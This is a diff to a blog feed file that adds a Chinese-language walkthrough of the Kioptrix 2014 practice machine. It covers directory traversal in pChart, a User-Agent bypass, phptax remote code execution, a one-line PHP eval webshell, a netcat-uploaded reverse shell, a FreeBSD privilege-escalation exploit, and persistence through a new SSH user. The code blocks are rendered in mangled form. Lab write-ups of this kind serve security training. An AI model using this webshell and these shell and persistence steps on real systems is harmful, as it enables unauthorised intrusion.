@@ -71,9 +71,25 @@
       <link href="/posts/48453.html"/>
       <url>/posts/48453.html</url>
       
-        <content type="html"><![CDATA[<a id="more"></a>]]></content>
+        <content type="html"><![CDATA[<p>第六个靶机</p><a id="more"></a><p>nmap -sn 先找到ip地址192.168.2.179</p><p>先nmap看开了什么服务。先看基础服务有没有漏洞，再针对web测试</p><p><img src="/posts/48453/image-20220222142129618-164559688110713.png" alt="image-20220222142129618"></p><p>searchsploit apache 和 mod_ssl 都没有发现可用的exp</p><p>只开了80 和 8080</p><p>80只显示it works,8080 直接forbidden</p><p>80端口，按f12元素审查，发现有注释</p><p><img src="/posts/48453/image-20220222144354174-164559688110714.png" alt="image-20220222144354174"></p><p>访问</p><p><img src="/posts/48453/image-20220222144503631-164559688110715.png" alt="image-20220222144503631"></p><p>点击后发现是使用php画图的工具，下面是代码，上面是图。此时想找找有没有可以执行代码的类似example的地方。</p><p><img src="/posts/48453/image-20220222144613243-164559688110716.png" alt="image-20220222144613243"></p><p>没有发现容易利用的地方，去searchsploit一下pchart</p><p>发现2.1.3有exp</p><p><img src="/posts/48453/image-20220222145837729-164559688110717.png" alt="image-20220222145837729"></p><p>看路径</p><p><img src="/posts/48453/image-20220222145903145-164559688110718.png" alt="image-20220222145903145"></p><p>打开，pChart2.1.3的example中存在目录遍历</p><p><img src="/posts/48453/image-20220222153605714-164559688110719.png" alt="image-20220222153605714"></p><p>在网页中尝试一下</p><p><img src="/posts/48453/image-20220222153704788-164559688110720.png" alt="image-20220222153704788"></p><p>既然可以读文件，读一下敏感文件</p><p>/etc/motd 发现操作系统是FreeBSD 9.0,有两个可用的提权exp</p><p><img src="/posts/48453/image-20220222162700728-164559688110721.png" alt="image-20220222162700728"></p><p>有php.ini</p><p>在搜索的过程中发现,phpinfo结合文件包含可以getshell（意外收获</p><p>然而php.ini并不可以，因为利用需要phpinfo动态打印出的$_FILES的值。</p><p>既然8080端口是403，可以看下配置文件，为什么403</p><p>在<a href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout" target="_blank" rel="noopener">这里</a>有各种系统下apache配置文件的位置</p><p>其实前面fuzz敏感文件的时候，应该fuzz出来，现在把这个路径加到字典里面了。</p><p><img src="/posts/48453/image-20220222174917986-164559688110722.png" alt="image-20220222174917986"></p><p>在<a href="https://httpd.apache.org/docs/2.2/mod/mod_authz_host.html" target="_blank" rel="noopener">这里</a>看到是要存在名为Mozilla4_browser的环境变量，而Mozilla4_browser的含义由前面的SetEnvIf定义。</p><p>可以看到 User-Agent要是 <code>^Mozilla/4.0</code>这里是正则，意思是以Mozilla/4.0开头都行</p><p>进来之后是phptax</p><p><img src="/posts/48453/image-20220222175419964-164559688110723.png" alt="image-20220222175419964"></p><p>searchsploit发现有RCE的exp</p><p>尝试了下nc正连连不上，反连可以连回来，可以执行命令但没有回显</p><p><img src="/posts/48453/image-20220223104057040-164559688110724.png" alt="image-20220223104057040"></p><p>那就写个webshell</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs echo%20'<?php%20eval($_GET[" pass"]);'%20>a.php```"><br>![image-20220223121905427](靶机-Kioptrix2014&#x2F;image-20220223121905427-164559688110725.png)<br><br>可以有回显地执行命令了<br><br>which nc,有nc<br><br>![image-20220223131034299](靶机-Kioptrix2014&#x2F;image-20220223131034299-164559688110726.png)<br><br>直接nc -e ，不行<br><br>man nc，看下<br><br>![image-20220223132353512](靶机-Kioptrix2014&#x2F;image-20220223132353512-164559688110727.png)<br><br>这用法好像不太一样<br><br>用nc 加 重定向，把[php_reverse_shell](https:&#x2F;&#x2F;github.com&#x2F;pentestmonkey&#x2F;php-reverse-shell)传过去，访问，拿到shell<br><br>![image-20220223133328058](靶机-Kioptrix2014&#x2F;image-20220223133328058-164559688110728.png)<br><br>用户是www<br><br>用前面的FreeBSD9.0提权exp：<br><br>先nc+重定向把xx.c传上去<br><br>gcc xx.c<br><br>.&#x2F;a.out<br><br>提权成功<br><br>![image-20220223134525998](靶机-Kioptrix2014&#x2F;image-20220223134525998-164559688110729.png)<br><br>到这里应该结束了，偶然看到带一篇文章，现在执行passwd会报错。<br><br>&#96;&#96;&#96;echo sshd_enable&#x3D;&quot;YES&quot; &gt;&gt; &#x2F;etc&#x2F;rc.conf<br></code></pre></td></tr></table></figure><figure class="hljs highlight plain"><figcaption><span>start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs /etc/rc.d/sshd"><br>&#96;&#96;&#96;add user xxx<br></code></pre></td></tr></table></figure><p>然后再用添加的用户ssh，再提权，就可以改root密码了。</p><p><img src="/posts/48453/image-20220223135620575-164559688110730.png" alt="image-20220223135620575"></p><p>最后</p><p><img src="/posts/48453/image-20220223135731201-164559688110731.png" alt="image-20220223135731201"></p><h5 id="总结下思路"><a href="#总结下思路" class="headerlink" title="总结下思路"></a>总结下思路</h5><p>元素审查发现url</p><p>目录遍历读取apache文件，了解到403站点的规则</p><p>通过无回显命令执行漏洞写webshell到有回显</p><p>通过webshell使用nc+重定向上传php_reverse_shell</p><p>提权后创建新用户，开启ssh使用新用户登陆后再提权</p><h5 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h5><p>php_reverse_shell</p><p>phpinfo+文件包含</p><p>FreeBSD下apache配置文件的路径加入字典</p>]]></content>
       
       
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 靶机 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -97,6 +113,12 @@
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
       
     </entry>
     
